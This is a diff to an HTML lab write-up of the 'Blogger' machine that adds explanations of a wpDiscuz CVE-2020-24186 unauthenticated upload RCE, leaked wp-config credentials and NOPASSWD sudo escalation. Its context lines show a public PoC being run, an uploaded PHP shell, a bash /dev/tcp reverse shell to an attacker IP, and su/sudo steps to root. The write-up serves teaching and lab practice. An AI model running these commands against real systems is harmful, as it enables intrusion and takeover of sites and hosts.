@@ -6196,6 +6196,17 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#how-the-wpdiscuz-upload-rce-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How the wpDiscuz upload RCE works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#user-flag" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -6219,6 +6230,34 @@
       
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="4. Privilege escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-credentials-in-wp-configphp-matter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why credentials in wp-config.php matter
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-nopasswd-all-sudo-becomes-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How NOPASSWD: ALL sudo becomes root
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -8994,6 +9033,17 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#how-the-wpdiscuz-upload-rce-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How the wpDiscuz upload RCE works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#user-flag" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -9017,6 +9067,34 @@
       
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="4. Privilege escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#why-credentials-in-wp-configphp-matter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Why credentials in wp-config.php matter
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-nopasswd-all-sudo-becomes-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How NOPASSWD: ALL sudo becomes root
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -9142,6 +9220,10 @@
 <p><img alt="Index of /assets/fonts showing a hidden blog/ subdirectory" src="../images/blogger/image-1.png" /></p>
 <p>A <code>blog/</code> folder sits buried under <code>assets/fonts/</code> — an unusual, deliberately-obscured path for the actual application:</p>
 <p><img alt="The WordPress site living at /assets/fonts/blog/" src="../images/blogger/image-2.png" /></p>
+<div class="admonition info">
+<p class="admonition-title">Why directory listing matters here</p>
+<p>Apache's <code>Options +Indexes</code> turns every directory without an <code>index.*</code> file into a browsable file listing. A WordPress install hidden under an unrelated path (<code>/assets/fonts/blog/</code>) is "security through obscurity" — it requires no authentication, so once the obscuring path is found, nothing else protects it. The misconfigured <code>Indexes</code> directive is precisely what breaks that obscurity: fuzzing the webroot alone found only top-level folders like <code>assets</code>, but browsing that already-discovered directory by hand revealed the nested, otherwise-unlinked <code>blog/</code> application underneath it.</p>
+</div>
 <h3 id="fingerprinting-the-cms">Fingerprinting the CMS<a class="headerlink" href="#fingerprinting-the-cms" title="Permanent link">&para;</a></h3>
 <p><code>cmseek</code> and <code>wpscan</code> both confirm the stack and surface a version old enough to matter:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://blogger.pg/assets/fonts/blog/<span class="w"> </span>--enumerate<span class="w"> </span>--api-token<span class="w"> </span>&lt;token&gt;
@@ -9158,6 +9240,10 @@
 </span></code></pre></div>
 <p><code>wpDiscuz</code> 7.0.4 is vulnerable to <strong>CVE-2020-24186</strong> — an unauthenticated arbitrary file upload in the comment form's image-upload handler that leads to remote code execution. A WordPress user enumeration and password brute-force against <code>wp-admin</code>/XML-RPC were tried first and went nowhere, and a known exploit for the <code>poseidon</code> theme also failed, so the plugin vulnerability was the way in.</p>
 <p><img alt="GitHub PoC for the wpDiscuz 7.0.4 unauthenticated RCE" src="../images/blogger/image-5.png" /></p>
+<div class="admonition info">
+<p class="admonition-title">Why the plugin, not the core, was the real target</p>
+<p>WordPress core fingerprinting (version, theme) tells you where to <em>stop</em> looking: a 2018 core release with no known pre-auth RCE is not, by itself, an entry point. Plugins are where most real-world WordPress compromises happen, because they are written by third parties with far less security scrutiny than core, are rarely updated once installed, and run with the exact same filesystem/PHP privileges as the rest of the site. An "aggressive" <code>wpscan</code> plugin scan brute-forces plugin slugs/version strings against the site instead of relying on passive page signatures — it is slow (30+ minutes here) precisely because it is checking far more candidates, but it is what surfaced <code>wpdiscuz</code>, a comment/discussion plugin that had no business accepting unauthenticated file uploads the way it turned out to.</p>
+</div>
 <h2 id="3-foothold-wpdiscuz-unauthenticated-rce-cve-2020-24186">3. Foothold — wpDiscuz unauthenticated RCE (CVE-2020-24186)<a class="headerlink" href="#3-foothold-wpdiscuz-unauthenticated-rce-cve-2020-24186" title="Permanent link">&para;</a></h2>
 <p>The public PoC abuses wpDiscuz's comment-image upload: it swaps the MIME type validation so a PHP payload is accepted as an "image" and dropped into <code>wp-content/uploads/</code>, where Apache will still execute it.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/carlosalbertotuma/wpDiscuz-7.0.4-PoC-RCE.git
@@ -9169,6 +9255,13 @@
 </span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>[+] Shell uploaded: http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/06/jcqwshhdew-1782113024.8162.php
 </span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </span></code></pre></div>
+<h3 id="how-the-wpdiscuz-upload-rce-works">How the wpDiscuz upload RCE works<a class="headerlink" href="#how-the-wpdiscuz-upload-rce-works" title="Permanent link">&para;</a></h3>
+<p>wpDiscuz lets visitors attach an image to a comment without logging in — a deliberate feature, since comment forms are meant to be usable by anonymous visitors. That upload handler is where CVE-2020-24186 lives.</p>
+<ul>
+<li><strong>The vulnerability class.</strong> This is an <strong>unauthenticated arbitrary file upload</strong>, directly reachable by anyone who can load the page with the comment form — no WordPress account, no admin session, no CSRF bypass required. Arbitrary file upload turns into remote code execution the moment two conditions hold: (a) the uploaded file lands somewhere the web server will treat as executable code, and (b) the file itself can contain code the server understands (here, PHP).</li>
+<li><strong>The root cause.</strong> The plugin's handler is only supposed to accept image MIME types (<code>image/jpeg</code>, <code>image/png</code>, etc.). The PoC works by manipulating how the upload's content type is reported to the server-side check, so the validation inspects an attacker-controlled value — a declared MIME type or crafted multipart field — instead of verifying the actual decoded file content. A request can therefore claim to be an image while the file written to disk has a <code>.php</code> extension and PHP source as its body. This is a textbook <strong>insufficient MIME/type validation</strong> flaw — trusting client-supplied metadata for a security decision — the same root cause behind most file-upload bypass bugs, regardless of the framework involved.</li>
+<li><strong>Why it gives <code>www-data</code>.</strong> WordPress's <code>wp-content/uploads/</code> directory is served directly by Apache and, on a default or unhardened install, has no <code>.htaccess</code> rule disabling PHP execution inside it. Once the malicious <code>.php</code> file is written there, simply requesting its URL causes Apache (via <code>mod_php</code>) to execute it with the privileges of the web server process — <code>www-data</code> — exactly as it would execute any legitimate WordPress file. The PoC automates two steps: (1) a crafted multipart upload that gets the payload onto disk, parsing the JSON response for the generated filename, then (2) a request to that uploaded file's URL with a <code>cmd</code>-style parameter, which the uploaded PHP stub uses to shell out and execute attacker-supplied commands.</li>
+</ul>
 <p>Confirmed command execution as <code>www-data</code>, so the same script delivers a full reverse shell:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>python3<span class="w"> </span>wpdiscuz_rce.py<span class="w"> </span>-u<span class="w"> </span>http://blogger.pg/assets/fonts/blog/<span class="w"> </span>-p<span class="w"> </span><span class="s2">"/?p=1"</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>--cmd<span class="w"> </span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.207/9001 0&gt;&amp;1'"</span>
@@ -9193,6 +9286,8 @@
 </span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>define('DB_USER', 'root');
 </span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>define('DB_PASSWORD', 'sup3r_s3cr3t');
 </span></code></pre></div>
+<h3 id="why-credentials-in-wp-configphp-matter">Why credentials in <code>wp-config.php</code> matter<a class="headerlink" href="#why-credentials-in-wp-configphp-matter" title="Permanent link">&para;</a></h3>
+<p><code>wp-config.php</code> is the one file every WordPress install needs in plaintext at runtime — PHP has no built-in secure secret store, so the database username, password, host, and WordPress's internal secret keys all sit in a file readable by whatever user the webserver runs as. That is an accepted risk <em>as long as</em> only the webserver process can read the file. The danger appears the moment another foothold — here, the <code>www-data</code> shell gained from the RCE — can also read arbitrary files on disk: the "runtime secret" instantly becomes an "attacker-readable secret." Database credentials are also frequently <strong>reused</strong> across local accounts, which is exactly the pivot attempted next; even when a leaked DB password is not directly reusable for shell access, it still hands over the application's entire dataset — user table, password hashes, private content — for free.</p>
 <p>That password is reused for the local MySQL/MariaDB <code>root</code> account, which confirms database access but doesn't directly hand over a shell as the application only stores a hashed WordPress login. Since local <code>su</code> attempts against <code>james</code>, <code>ubuntu</code>, and <code>root</code> all fail with guessed/known values, the home directories are checked for any other account:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>su<span class="w"> </span>vagrant
 </span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="c1"># Password: vagrant</span>
@@ -9207,6 +9302,14 @@
 <div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>User vagrant may run the following commands on ubuntu-xenial:
 </span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>    (ALL) NOPASSWD: ALL
 </span></code></pre></div>
+<h3 id="how-nopasswd-all-sudo-becomes-root">How <code>NOPASSWD: ALL</code> sudo becomes root<a class="headerlink" href="#how-nopasswd-all-sudo-becomes-root" title="Permanent link">&para;</a></h3>
+<p><code>sudo -l</code> lists what the current user is permitted to run under <code>sudo</code>, and <code>(ALL) NOPASSWD: ALL</code> is the least restrictive entry the sudoers syntax supports:</p>
+<ul>
+<li><code>(ALL)</code> — the rule applies when running as <em>any</em> target user, including <code>root</code>.</li>
+<li><code>ALL</code> (the command field) — <em>any</em> command, with no path and no argument restriction.</li>
+<li><code>NOPASSWD:</code> — sudo does not re-prompt for the invoking user's own password before honoring the rule.</li>
+</ul>
+<p>Put together, this is not a restricted privilege at all — it is unconditional root access gated by nothing but already being logged in as <code>vagrant</code>. This configuration exists on Vagrant boxes by design, so provisioning scripts can run privileged setup commands without an interactive password prompt; it is meant to be stripped before a box goes anywhere near production, and on this target it was not. Any command run through <code>sudo</code> here — <code>sudo su</code>, <code>sudo bash</code>, <code>sudo id</code> — executes as <code>root</code> with no further checks.</p>
 <h2 id="5-root-prooftxt">5. Root / proof.txt<a class="headerlink" href="#5-root-prooftxt" title="Permanent link">&para;</a></h2>
 <p>Passwordless, unrestricted sudo is a direct path to a root shell:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>sudo<span class="w"> </span>su
